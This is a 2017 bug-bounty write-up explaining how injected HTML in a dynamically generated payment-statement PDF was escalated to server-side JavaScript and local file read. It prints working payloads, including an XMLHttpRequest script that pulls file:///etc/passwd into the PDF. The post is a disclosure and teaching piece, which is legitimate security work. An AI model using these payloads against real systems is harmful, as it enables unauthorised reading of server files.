---
title: "Local File Read via XSS in Dynamically Generated PDF"
date: Wed, 08 Nov 2017 10:05:00 +0000
draft: false
type: posts
categories: 
- 
---
# Local File Read via XSS in Dynamically Generated PDF

<br/>

<br/>
REDIRECTING TO THE NEW BLOG ...
===============================

setTimeout(()=> location="https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/",3000); Hello Hunters,  
                        This time I am writing about a Vulnerability found in another private program(xyz.com) on Bugcrowd which at first I thought wasn't much harmful(P4) but later escalated it to a P1.  
  
While browsing the Application I came across an endpoint which allowed us to download some kind of Payment Statements as PDF.  
  
The URL looked like this  
  
https://xyz.com/payments/downloadStatements?Id=b9bc3d&utrnumber=xyz&date=2017-08-11&settlement\_type=all&advice\_id=undefined  
  
I saw that the Value of utr number is reflected inside the PDF file that got downloaded so I wrote some HTML in **utrnumber** parameter as **"><S>aaa**   
  
https://xyz.com/payments/downloadStatements?Id=b9bc3d&**utrnumber**\=**"><S>aaa** &date=2017-08-11&settlement\_type=all&advice\_id=undefined  
  
Upon opening this PDF I found that the HTML was rendered and could be seen in PDF. This kind of vulnerability usually leads to XSS but this time it was inside a PDF which was being generated dynamically.  
If you want to learn more about XSS then I advise to checkout this great intro on XSS: [https://www.aptive.co.uk/blog/xss-cross-site-scripting/](https://www.aptive.co.uk/blog/xss-cross-site-scripting/)  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7VodlIxskfhxs_IAhV5gn-pKxLSR8ExxXjeCIKQKBuXBJz7rBE-8VVVhq-2C0xTrUyifVnznfyaRkXYtIaYx62sPPSpRbcklCXmOBczGIzAAqIkJybxBTle-4GIzY2JQLchOts8xNCA5J/s1600/Screenshot+from+2017-11-08+14-29-18.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7VodlIxskfhxs_IAhV5gn-pKxLSR8ExxXjeCIKQKBuXBJz7rBE-8VVVhq-2C0xTrUyifVnznfyaRkXYtIaYx62sPPSpRbcklCXmOBczGIzAAqIkJybxBTle-4GIzY2JQLchOts8xNCA5J/s1600/Screenshot+from+2017-11-08+14-29-18.png)

  
I tried if I could use an iframe and load internal domains in the frame or if I could iframe file:///etc/passwd but none of the tricks worked! also, I wasn't able to iframe external domains.  
  
https://xyz.com/payments/downloadStatements?Id=b9bc3d&**utrnumber**\=**"><iframe src="http://localhost"></iframe>**&date=2017-08-11&settlement\_type=all&advice\_id=undefined  

  

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuNWfSvkfbvBSlBILzgxMI5sHeUyrQiZh8mGb6SIw5iItdOVJ-KjuipTKE57T9SpHpA2MIh9avSs0qQTCBBuMLoG1mGWHnCOTLBtGQ-Krus4X5pm2c6oMRXi1UnfFVKUJzzpsBgvWYc2zd/s1600/Screenshot+from+2017-11-08+14-33-13.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuNWfSvkfbvBSlBILzgxMI5sHeUyrQiZh8mGb6SIw5iItdOVJ-KjuipTKE57T9SpHpA2MIh9avSs0qQTCBBuMLoG1mGWHnCOTLBtGQ-Krus4X5pm2c6oMRXi1UnfFVKUJzzpsBgvWYc2zd/s1600/Screenshot+from+2017-11-08+14-33-13.png)

But, from now I didn't know if I could go further because I wasn't sure if javascript could be executed like this in PDF.So after playing around a lot I found that we could execute javascript with the help of DOM Manipulation  
  
**<p id="test">aa</p><script>document.getElementById('test').innerHTML+='aa'</script>**   
  
https://xyz.com/payments/downloadStatements?Id=b9bc3d&**utrnumber**\=**<p id="test">aa</p><script>document.getElementById('test').innerHTML+='aa'</script>**&date=2017-08-11&settlement\_type=all&advice\_id=undefined  

  

and Upon downloading PDF I found that it contained the "aaaa" :D  
  
also sometime later, I found that I could also use document.write() function to show results more easily.  
  
**<img src=x onerror=document.write('aaaa')>**  

  

https://xyz.com/payments/downloadStatements?Id=b9bc3d&**utrnumber**\=**<img src=x onerror=document.write('aaaa')>**&date=2017-08-11&settlement\_type=all&advice\_id=undefined  

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEim44RscquFzQ42O3Pu-qD2c2PRYlkaxKLUteTDklwTHsoKzwAhJu18nNCXQfzj7cYveS4cMqN47JjHHoeOZL3vyEnZmwLTXpcru5121pEM3SrIBK77mhmzPOcT2xUZeEiz6b-fdXRFN7UI/s1600/Screenshot+from+2017-11-08+14-53-58.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEim44RscquFzQ42O3Pu-qD2c2PRYlkaxKLUteTDklwTHsoKzwAhJu18nNCXQfzj7cYveS4cMqN47JjHHoeOZL3vyEnZmwLTXpcru5121pEM3SrIBK77mhmzPOcT2xUZeEiz6b-fdXRFN7UI/s1600/Screenshot+from+2017-11-08+14-53-58.png)

after this I checked the **window.location** of where this javascript is executed and to my surprise it was executing in file:// origin on the Server

  

https://xyz.com/payments/downloadStatements?Id=b9bc3d&**utrnumber**\=**<img src=x onerror=document.write('aaaa'%2bwindow.location)>**&date=2017-08-11&settlement\_type=all&advice\_id=undefined

  

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjdgXFqIsuqvFETJdLVMTGvdW2Ae7qyHkIgzh8AkUXoz5EX2jH8PH46Vt-Q_URKUabl9w5VUTFfnEcH_3NvsUqmTd1dNybbhE2ycw2jrz8BX_vgMiwphp3cIBEBj-5wZGndK-BHkqMxYht7/s1600/Screenshot+from+2017-11-08+14-56-39.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjdgXFqIsuqvFETJdLVMTGvdW2Ae7qyHkIgzh8AkUXoz5EX2jH8PH46Vt-Q_URKUabl9w5VUTFfnEcH_3NvsUqmTd1dNybbhE2ycw2jrz8BX_vgMiwphp3cIBEBj-5wZGndK-BHkqMxYht7/s1600/Screenshot+from+2017-11-08+14-56-39.png)

Now since its executing on file://, I tried if we could access file:///etc/passwd via XHR(XMLHttpRequest), I wasn't sure myself.

  

**<script>**

**x=new XMLHttpRequest;**

**x.onload=function(){**

**document.write(this.responseText)**

**};**

**x.open("GET","file:///etc/passwd");**

**x.send();**

**</script>** 

  

  

https://xyz.com/payments/downloadStatements?Id=b9bc3d&utrnumber=**<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>**&date=2017-08-11&settlement\_type=all&advice\_id=undefined  
  
and then you know ;) 

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizhZcBvjXYUtvbYRfQ7S8Z2-mBLePc5wReLYaeeqLc_wv_PthCBSZQpdEG5j5vnl5d1SiFfEagzkBtgGGN8lLD1PKigFInjQN334AcwIQCk2kPYX7xfoO-LXuS9oqjmyzl2OOZxOs5wvHc/s1600/Screenshot+from+2017-11-08+15-01-54.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizhZcBvjXYUtvbYRfQ7S8Z2-mBLePc5wReLYaeeqLc_wv_PthCBSZQpdEG5j5vnl5d1SiFfEagzkBtgGGN8lLD1PKigFInjQN334AcwIQCk2kPYX7xfoO-LXuS9oqjmyzl2OOZxOs5wvHc/s1600/Screenshot+from+2017-11-08+15-01-54.png)

  

  

so That was it, XSS in Server Side Generated PDFs to Local File Read! 

  

However, it took :P me some time to figure this You could see the number of PDFs I had to download: 

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIllxqtZL1f9TrM-Wct_7gkMpaxKf9-T8IeagitPih44yuMuNdx9xhqhkJV2uRcn-4lcKz0vYu135lgGsIjjq7bGbzOGSV3WuKbPDjBwDlOqVznL9JNuu4aogmz09DBxMopkD7QU4knJ6T/s1600/Screenshot+from+2017-11-08+15-03-53.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIllxqtZL1f9TrM-Wct_7gkMpaxKf9-T8IeagitPih44yuMuNdx9xhqhkJV2uRcn-4lcKz0vYu135lgGsIjjq7bGbzOGSV3WuKbPDjBwDlOqVznL9JNuu4aogmz09DBxMopkD7QU4knJ6T/s1600/Screenshot+from+2017-11-08+15-03-53.png)

  

  

  

./peace  
Rahul Maini

#### [Source](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)

<br/>
---
